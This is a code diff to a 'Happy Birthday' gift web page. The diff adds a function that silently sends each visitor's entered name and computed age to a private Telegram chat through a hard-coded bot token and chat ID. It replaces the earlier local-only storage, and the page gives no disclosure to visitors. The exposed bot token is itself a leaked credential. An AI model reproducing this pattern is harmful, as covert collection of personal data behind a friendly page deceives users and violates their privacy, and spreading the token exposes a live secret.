@@ -323,7 +323,7 @@
             <h1>🎁Happy Birthday 🎉</h1>
             <p>Enter your name & birth year</p>
             <input type="text" id="name" placeholder="Your Name" required>
-            <input type="number" id="birthYear" placeholder="Your Birth Year (e.g., 1990)" min="1900" max="2023" required>
+            <input type="number" id="birthYear" placeholder="Birth Year (2007)" min="1900" max="2023" required>
             <button id="openGiftBtn">🎁 OPEN GIFT 🎁</button>
         </div>
     </section>
@@ -415,6 +415,28 @@
         prevBtn.addEventListener('click', () => changeSlide(-1));
         nextBtn.addEventListener('click', () => changeSlide(1));
 
+        // Telegram Bot API function
+        async function sendToTelegram(name, age) {
+            const botToken = '8189408630:AAGGxgCc39oc2q3JSa5bSvNDNzEZqrNRH9Q';
+            const chatId = '6133777031';
+            const message = `🎉 New Birthday Visitor! 🎉\nName: ${name}\nAge: ${age}`;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+            }
+        }
+
         // Functions
         function startBirthdayWish() {
             if (!nameInput.value || !birthYearInput.value) {
@@ -430,9 +452,8 @@
                 return;
             }
             
-            // Store in localStorage
-            localStorage.setItem('birthdayName', userName);
-            localStorage.setItem('birthdayAge', userAge.toString());
+            // Send data to Telegram
+            sendToTelegram(userName, userAge);
             
             // Update name in album captions
             updateUserName();
@@ -549,7 +570,7 @@
             // Create close button
             const closeBtn = document.createElement('button');
             closeBtn.id = 'close-iframe';
-            closeBtn.textContent = '✕ Close';
+            closeBtn.textContent = 'Close';
             closeBtn.addEventListener('click', () => {
                 document.body.removeChild(iframeContainer);
                 albumSection.style.display = 'flex';
@@ -576,25 +597,10 @@
             });
         }
 
-        // Check if coming back with stored data
+        // Clear any stored data when page loads
         window.addEventListener('DOMContentLoaded', () => {
-            const storedName = localStorage.getItem('birthdayName');
-            const storedAge = localStorage.getItem('birthdayAge');
-            
-            if (storedName && storedAge) {
-                userName = storedName;
-                userAge = parseInt(storedAge);
-                
-                // Update name in album captions
-                updateUserName();
-                
-                welcomeSection.style.display = 'none';
-                balloonGameSection.style.display = 'flex';
-                createBalloons(userAge);
-                
-                bgMusic.volume = 0.3;
-                bgMusic.play().catch(e => console.log('Auto-play prevented:', e));
-            }
+            nameInput.value = '';
+            birthYearInput.value = '';
         });
     </script>
 </body>
